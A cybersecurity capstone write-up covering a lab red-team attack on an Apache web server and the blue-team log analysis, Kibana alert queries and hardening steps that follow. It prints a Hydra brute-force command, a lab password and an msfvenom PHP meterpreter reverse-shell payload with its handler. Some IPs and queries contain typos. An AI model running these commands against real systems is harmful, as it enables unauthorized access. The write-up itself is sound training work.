# capstone-engagement-ft
Assessment, analysis and hardening of a vulnerable machine with roles as both red and blue team

## Table of Contents
This document contains the following sections:
1. **Network Topology**
2. **Red Team**: Security Assessment
3. **Blue Team**: Log Analysis and Attack Characterization
4. **Hardening**: Proposed Alarms and Mitigation Strategies

## Network Topology
![Network Topology](https://github.com/francescatirpak/capstone-engagement-ft/blob/main/Diagrams/NetworkTopology.png)

## Red Team: Security Assessment

### Recond: Describing the Target
Nmap identified the following hosts on the network:

| Hostname         | IP address     | Role on Network            |
|------------------|----------------|----------------------------|
| Capstone         | 192.168.1.105  | Web Server                 | 
| ELK              | 192.168.1.100  | SIEM System                |
| ML-RefVm-684427  | 192.168.1.1    | NATswitch                  |
| Kali             | 192.168.1.90   | Penetration Testing System |

### Vulnerability Assessment
The assessment uncovered the following critical vulnerabilities in the target:

**Vulnerability**
Apache Web Server allows directory listing to be viewed by public user.
**Description**
Attacker is able to utilize browser to read entire contents of directories on Capstone Apache web server.
**Impact**
Investigation of publicly readable files reveals user “Ashton” is administrator for directory: “/company_folders/secret_folder/”

**Vulnerability**
Weak login security.
**Description**
Weak password revealed under “rockyou” wordlist. No lockout for any amount of failed login attempts.
**Impact**
Brute force attack successful providing access to “/secret_folder/”
Password hash revealed for user “Ryan” and secure access instructions for connection to WebDAV server.

**Vulnerability**
Persistent reverse shell backdoor.
**Description**
Weak security on WebDAV server allows deployment of reverse shell payload exploit on web server. IPS/IDS/Firewall rules have open ports and allow undetected reverse shell.
**Impact**
Remote backdoor shell access gained to Capstone Apache web server. Flag discovered, and many files readable from session.

### Exploitation: Apache Web Server Directories

**01. Tools & Processes**

Navigating to 192.168.1.105 with any web browser & investigating any folders.

![Apache Web Server Tools & Processes](https://github.com/francescatirpak/capstone-engagement-ft/blob/main/Images/ApacheWebServer_ToolsProcesses.png)

 **02. Achievements**
 
* Most pages on Apache Web Server directories direct questions to page “`/company_folders/secret_folder/`” which is locked behind authentication page.

* Reviewed files for further reconnaissance and discovered user Ashton is admin for secret folder.

**03. Documentation**

![Apache Web Server Directories Exploitation](https://github.com/francescatirpak/capstone-engagement-ft/blob/main/Images/ApacheWebServer_Achievements.png)

### Exploitation: Weak Login Security

**01. Tools & Processes**

* Executed Hydra brute force attack with wordlist “rockyou” to discover password for Ashton’s account.

 `hydra -l ashton -P /usr/share/wordlists/rockyou.txt.gz -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder`

 **02. Achievements**
 
* Password direcovered for Ashton
`Ashton:leopoldo`

* Access to 
`/company_folders/secret_folder` was gained.

* Access info for `/webdav/` server discovered.

* Hash for user “Ryan” password discovered and cracked with Crack Station to access WEBDav.

**03. Documentation**

![Weak Login Security Hydra](https://github.com/francescatirpak/capstone-engagement-ft/blob/main/Images/WeakLoginSecurity_Hydra.png)

![Weak Login Security Secret Folder](https://github.com/francescatirpak/capstone-engagement-ft/blob/main/Images/WeakLoginSecurity_SecretFolder.png)

![Weak Login Security Crack Station](https://github.com/francescatirpak/capstone-engagement-ft/blob/main/Images/WeakLoginSecurity_CrackStation.png)

![Weak Login Security passwd.dav](https://github.com/francescatirpak/capstone-engagement-ft/blob/main/Images/WeakLoginSecurity_passwd.dav.png)

### Exploitation: Persistent Reverse Shell Backdoor

**01. Tools & Processes**

* Scripted and uploaded msfvenom payload:
`msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=4444 R >> shell.php`

* Established remote listener.
`msfconsole 
use exploit/multi/handler 
set payload php/meterpreter/reverse_tcp 
set LHOST 192.198.1.90 
exploit`

Executed reverse shell backdoor on Capstone Apache server.

**02. Achievements**
Opened a remote backdoor shell to access the Apache Web Server on Capstone machine. 

Gained access to the root directory on Capstone server (192.168.1.105).

**03. Documentation**

![Persistent Reverse Shell Backdoor msfvenom Payload](https://github.com/francescatirpak/capstone-engagement-ft/blob/main/Images/PersistentReverseShellBackdoor_msfvenomPayload.png)

![Persistent Reverse Shell Backdoor Remote Listener](https://github.com/francescatirpak/capstone-engagement-ft/blob/main/Images/PersistentReverseShellBackdoor_RemoteListener.png)

## Blue Team: Log Analysis and Attack Characterization

### Analysis: Identify the Port Scan

![Identify the Port Scan](https://github.com/francescatirpak/capstone-engagement-ft/blob/main/Images/LogAnalysisAttackCharacterization_PortScan.png)

* This port scan performed by the listener occurred at 12:38AM on June 30th, 2021. This is likely because of the amount of network packets coming from the same source port (40570).
* 10,000 packets were sent via port 40570 from IP address 192.168.1.90 (attacking machine).

### Analysis: Finding the Request for the Hidden Directory

![Finding the Request for the Hidden Directory](https://github.com/francescatirpak/capstone-engagement-ft/blob/main/Images/LogAnalysisAttackCharacterization_HiddenDirectory.png)

* The request to access the hidden directory was made on June 16th, 2021, between 1-4PM, with the initial request occurring at 1:28PM.

### Analysis: Uncovering the Brute Force Attack

* By searching for Hydra logs, we can determine 638,726 attempts were made to access the directory before it being successful.
* There are 4 successful access hits to the page, which means 638,722 requests were made before it was successfully breached.

![Brute Force Attack All](https://github.com/francescatirpak/capstone-engagement-ft/blob/main/Images/LogAnalysisAttackCharacterization_BruteForce(1).png)

![Brute Force Attack OK](https://github.com/francescatirpak/capstone-engagement-ft/blob/main/Images/LogAnalysisAttackCharacterization_BruteForce(2).png)

### Analysis: Finding the WebDAV Connection

* Kibana logged 592,551 hits to the /webdav directory and 10 hits accessing the shell.php payload.

![WebDAV passwd.dav](https://github.com/francescatirpak/capstone-engagement-ft/blob/main/Images/LogAnalysisAttackCharacterization_WebDAV(1).png)

![WebDAV shell.php](https://github.com/francescatirpak/capstone-engagement-ft/blob/main/Images/LogAnalysisAttackCharacterization_WebDAV(2).png)

## Blue Team: Proposed Alarms and Mitigation Strategies

### Mitigation: Blocking the Port Scan

**Alarm**

Search Criteria:
* `Destination.ip:192.168.1.105 AND source.ip!:192.1688.1.105 AND destination.port!: 443 AND destination.port!:80`

Report Criteria:
* Number of ports accessed per source IP per second

Alarm threshold:
* Alert email for appropriate personnel when more than 3 scans other than ports 443 or 80 are detected at the same timestamp with the same IP address source. 
* Critical alert can be posted for aggressive scans and any use of Nmap.

**System Hardening**

* Whitelist any known IPs and use firewall rules to block all other traffic to prevent unauthorized IPs from scanning.
* Close any ports that do not need to stay open. 
  *  Perform regular checks on any other open or filtered ports. All services running in ports should stay updated at all times.
* Obfuscate and limit information. Slow scans to prevent attempts and results. 

### Mitigation: Finding the Request for the Hidden Directory

**Alarm**

Search Criteria:
* `source.ip!: 192.168.1.105 AND source.ip!:192.168.1.1 AND url.path:”*secret_folder*”`

Report Criteria:
* Attempt to access “secret_folder” from external IP.

Alarm threshold:
* Alert email to appropriate personnel when any access is detected on “secret_folder” from any IPs other than 192.168.1.105 or 192.168.1.1.

**System Hardening**

* The host configuration file should be modified to block outside access to “secret_folder.”
* Remove “secret_folder” entirely to block unwanted attempts to access.
* Remove all mention of secret directory in webserver.
* Encrypt information in confidential folders.

### Mitigation: Preventing Brute Force Attacks

**Alarm**

Search Criteria:
* `http.request.method: “get” AND user_agent.original:”Mozilla/4.0 (Hydra)” AND url.path:”/company_folders/secret_folder/”`

Report Criteria:
* Error (401) responses recorded within 10 second intervals.

Alarm threshold:
* Alert email to appropriate personnel when any access is detected on protected files and folders - more than 5 Error responses OR any OK responses from unknown IPs.

**System Hardening**

* Strong and complex password policy for all users, and even a more complex usernames than a first name of employee, which can be discovered easily on the webserver.
* Lock out after a certain number of failed login attempts. Multi-factor authentication. CAPTCHA to ensure user is human. Force password change every few months.
* Blacklist IPs after more than a certain number of failed login attempts. Rate-limit for blocking mass password attempts.

### Mitigation: Detecting the WebDAV Connection

**Alarm**

Search Criteria:
* `url.path:”*webdav*” AND source.ip!:192.168.1.150 OR source.ip!:192.168.1.1`

Report Criteria:
* Directory requested from unknown IPs.

Alarm threshold:
* Alert email to appropriate personnel when any requests are detected on protected files and folders from unknown IPs.

**System Hardening**

* The WebDav server should be hardened against access by any IP address other than whitelisted addresses. 
* There should also be a limited amount of login attempts as outlined previously. 
* WebDAV should also be disabled or updated to harden against attacks, since this program allows uploading of a malicious script. 
* Only allow internal access to WebDAV server.

### Mitigation: Identifying Reverse Shell Uploads

**Alarm**

Search Criteria:
* `http.request.method:”put” AND url.path:”*webdav*” AND source.ip!:192.168.1.1 OR source.ip!:192.168.1.105`

Report Criteria:
* “Put” method from unknown IPs.

Alarm threshold:
* Alert email to appropriate personnel when any “put” requests are detected on protected files and folders from unknown IPs.

**System Hardening**

* Block any IP addresses other than known whitelisted addresses to prevent reverse shells from being created over DNS.
* Reset permissions on the /webdav folder to read only to prevent any payloads from being added and executed within this server. Limit filetypes that can be uploaded.
* Filter or close any ports that are not necessary to be open.
